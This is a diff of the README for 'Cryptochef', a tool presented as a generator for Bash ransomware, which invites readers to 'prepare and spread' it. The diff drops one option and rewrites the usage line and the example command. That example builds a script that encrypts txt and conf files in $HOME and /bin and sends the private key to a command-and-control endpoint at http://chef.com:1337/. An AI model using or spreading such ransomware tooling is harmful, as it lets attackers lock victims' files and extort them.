@@ -3,14 +3,13 @@
 Cryptochef is your new ransomware kitchen appliance. Prepare and spread your favourite Bash GNU/Linux ransomware culinary recipes. Remember! Your fantasy is the best ingredient to cook the best ransomware of the world.
 
 ## How to use
-```cryptochef.sh [file extension filter] [directory filter] [encrypted extension] [private key size] [command and control endpoint] > [recipient name].sh```
+```cryptochef.sh [file extension filter] [directory filter] [private key size] [command and control endpoint] > [recipient name].sh```
 
 Example:
-```cryptochef.sh "(.*?)\.(txt|conf)" "\$HOME /bin" "egg" 4096 http://chef.com:1337/ > omelette.sh```
+```cryptochef.sh "(.*?)\.(txt|conf)" "\$HOME /bin" 4096 http://chef.com:1337/ > omelette.sh```
 Cook an omelette that:
 - Encrypts all file with *txt* and *conf* extension
 - Inside the *$HOME* and */bin* directories,
-- Change  its extension to *egg*,
 - Uses 4096 bit private key
 - Sends the private key to http://chef.com:1337/ endpoint
 
